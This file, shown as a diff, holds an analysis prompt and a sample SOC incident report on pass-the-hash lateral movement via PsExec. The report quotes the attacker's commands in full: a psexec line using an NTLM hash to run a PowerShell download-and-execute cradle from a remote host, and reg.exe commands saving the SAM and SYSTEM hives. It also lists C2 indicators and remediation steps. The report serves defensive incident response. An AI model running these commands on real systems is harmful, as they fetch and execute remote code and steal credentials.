@@ -1,0 +1,73 @@
+analysis prompt:
+initial_analysis = f"""
+We observe that the user J.Phillipsen used pass-the-hash to authenticate as svc_deploy to SRV-APPS01 using psexec from WKSTN-23. Using Psexec J.Phillipsen made SRV-APPS01 run a powershell cradle which established a
+tcp connection to odd-lilac-weasel.zone:4444, after that the same process tried to dump the SAM and SYSTEM hive on the SRV-APPS01. Our EDR stopped the dumping of SAM & SYSTEM and terminated the TCP connection to odd-lilac-weasel.zone:4444.
+However, the user J.Phillipsen is still in the network. Our hyposfesis is that J.Phillipsen is compromised and a threat actor has a foothold inside our network. The threat actor also seem to have access to the service account svc_deploy.
+"""
+
+
+Title: Pass-the-Hash via PsExec and blocked SAM/SYSTEM dump on SRV-APPS01
+Date: 2025-10-24
+Alert Type/Category: Lateral Movement (Pass-the-Hash) and Credential Access
+Severity: High
+Analyst Name: Tier 1 SOC Analyst
+Case #: ALRT-2025-10-24-WKSTN-23-SRV-APPS01
+
+# DETECTION AND ANALYSIS
+
+## Alert Summary:
+XDR detected pass-the-hash driven remote execution and attempted credential dumping on SRV-APPS01 initiated from WKSTN-23 by user J.Phillipsen. This activity is consistent with lateral movement using PsExec to gain SYSTEM execution on a server, retrieve a payload, establish command-and-control, and harvest credentials from the SAM and SYSTEM hives. From WKSTN-23, powershell.exe launched PsExec to authenticate as CONTOSO\svc_deploy using an NTLM hash and start a SYSTEM PowerShell on SRV-APPS01, which then downloaded and executed a script from http://192.168.45.199/payloads/run.txt and opened an outbound connection to odd-lilac-weasel.zone:4444 before attempting to save the SAM and SYSTEM hives to C:\Windows\Temp; the hive dump was blocked and the associated network process was terminated. Command observed:
+```powershell
+psexec.exe \\SRV-APPS01 -u CONTOSO\svc_deploy -hashes 9f1c2a4d7e8b0c3f5a6d1e2b4c7a8f01 -s powershell.exe -c "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.199/payloads/run.txt') | IEX"
+```
+This runs PowerShell as SYSTEM on SRV-APPS01 via PsExec using a supplied NTLM hash and executes a downloaded script in memory.
+```cmd
+cmd.exe /c reg.exe save HKLM\SAM C:\Windows\Temp\SAM.bak /y & reg.exe save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.bak /y
+```
+This attempts to export the SAM and SYSTEM registry hives for credential extraction. We recommend that you investigate this activity further, as the activity appears to indicate an active foothold and compromised credentials (svc_deploy and possibly J.Phillipsen).
+
+## Key Details:
+Timeframe: 2025-10-24T10:15:03+02:00 to 2025-10-24T10:16:28+02:00
+User: J.Phillipsen
+Service Account: CONTOSO\svc_deploy
+Target Privilege Context: NT AUTHORITY\SYSTEM (on SRV-APPS01)
+Source Host: WKSTN-23
+Target Host: SRV-APPS01
+Source IP (SRV-APPS01): 10.0.12.37
+Destination Domain: odd-lilac-weasel.zone
+Destination Port: 4444
+URL: http://192.168.45.199/payloads/run.txt
+Process Chain (WKSTN-23): explorer.exe -> powershell.exe (PID 6160) -> psexec.exe (PID 6340)
+Process Chain (SRV-APPS01): services.exe -> PSEXESVC.exe (PID 748) -> powershell.exe (PID 8020) -> cmd.exe (PID 8132)
+File Path (PsExec on source): C:\Users\J.Phillipsen\Downloads\PsExec.exe
+File Path (PsExec service on target): C:\Windows\PSEXESVC.exe
+Command Executed (remote PowerShell): powershell.exe -c "(New-Object System.Net.WebClient).DownloadString('http://192.168.45.199/payloads/run.txt') | IEX"
+Command Executed (credential dumping attempt): reg.exe save HKLM\SAM C:\Windows\Temp\SAM.bak /y & reg.exe save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.bak /y
+Network Event: 10.0.12.37:49822 -> odd-lilac-weasel.zone:4444 (outbound)
+EDR Outcome: Hive dump attempt blocked; associated PowerShell/network process terminated
+
+## Consequence:
+The attacker achieved remote code execution on SRV-APPS01 with SYSTEM privileges using pass-the-hash, executed an in-memory PowerShell payload, and established outbound command-and-control. A credential dump of the SAM and SYSTEM hives was attempted, which, if successful, would enable extraction of local credentials and facilitate privilege escalation and further lateral movement. Although the hive dump was blocked and the C2 process terminated, the initiating workstation (WKSTN-23) and the service account (svc_deploy) may remain compromised, enabling continued access and potential re-entry.
+
+# CONTAINMENT
+
+## Executed Remediation Actions:
+The following containment actions has been performed by our SOC:
+- Validated and correlated events across WKSTN-23 and SRV-APPS01; escalated incident severity to High and initiated customer notification.
+- Confirmed EDR automatically blocked the registry hive dump attempt and terminated the associated malicious PowerShell/network process on SRV-APPS01.
+- Tagged and documented IOCs (odd-lilac-weasel.zone, 192.168.45.199, PsExec usage, commands) and preserved relevant telemetry for investigation.
+- Initiated internal watchlist for further occurrences of PsExec pass-the-hash and hive export commands across the environment.
+- Requested customer approval for host isolation of WKSTN-23 and SRV-APPS01 (no isolation performed due to EDR-only contract).
+
+## Recommended Remediation Actions:
+Our SOC recommends that you do the following containment actions:
+- Immediately isolate WKSTN-23 and SRV-APPS01 from the network (wired and wireless).
+- Disable or rotate the password for CONTOSO\svc_deploy; reset the password for user J.Phillipsen and force MFA re-enrollment; invalidate active sessions/tokens.
+- Block odd-lilac-weasel.zone and port 4444, and block 192.168.45.199 at firewalls, proxies, and EDR; add observed commands/paths to EDR block/alert policies where feasible.
+- Collect and preserve volatile data from both hosts (memory capture, running processes, network connections, scheduled tasks, services) before any reboot or reimage.
+- Quarantine and remove C:\Users\J.Phillipsen\Downloads\PsExec.exe if unauthorized; remove PSEXESVC service remnants from SRV-APPS01.
+- Run full EDR/AV scans on both hosts; hunt for PSEXESVC.exe and similar activity across other systems; search for use of svc_deploy across the domain.
+- Review and temporarily disable unnecessary SMB shares and mapped drives on SRV-APPS01; verify no malicious files/scripts in C:\Windows\Temp.
+- If integrity cannot be assured, reimage WKSTN-23 and SRV-APPS01 from known-good baselines; then apply patches and ensure EDR/AV signatures are current.
+- After eradication, rotate local administrator credentials (use LAPS if available) and clear cached credentials/tickets on affected systems.
+- Monitor for recurrence post-restoration and notify internal stakeholders (including the CISO) of incident details and actions taken.
